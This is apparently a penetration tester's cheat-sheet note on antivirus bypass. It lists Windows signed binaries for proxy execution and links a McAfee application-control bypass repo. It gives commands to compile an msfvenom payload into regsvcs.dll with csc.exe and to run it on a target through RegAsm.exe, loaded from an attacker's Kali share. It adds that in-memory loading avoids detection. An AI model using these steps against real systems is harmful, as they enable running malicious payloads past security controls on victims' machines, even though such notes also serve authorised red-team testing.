# AV bypass

**Bypass anti-virus**

* IEExec.exe C:\Windows\Microsoft.NET\Framework64\v2.0.50727
* caspol.exe C:\Windows\Microsoft.NET\Framework64\v4.0.30319
* RunDll32
* regsvr32
* Command of msfvenom
* [https://raw.githubusercontent.com/3gstudent/Bypass-McAfee-Application-Control--Code-Execution/master/regsvcs.cs](https://raw.githubusercontent.com/3gstudent/Bypass-McAfee-Application-Control--Code-Execution/master/regsvcs.cs)
  * Follow repo instructions
  * Update the file regsvcs.cs adding the payload generated by msfvenom
    * See below
  * Generate the .DLL using the .DLL and CSC.EXE : `C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regsvcs.dll /keyfile:key.snk regsvcs.cs`
  * On the target device : `C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe /u \\<IP-KALI>\SHARE\regsvcs.dll`

If loaded directly in memory, the antivirus will not detect the payload. Otherwise, if you upload it on the drive, the antivirus will scan it and could remove it
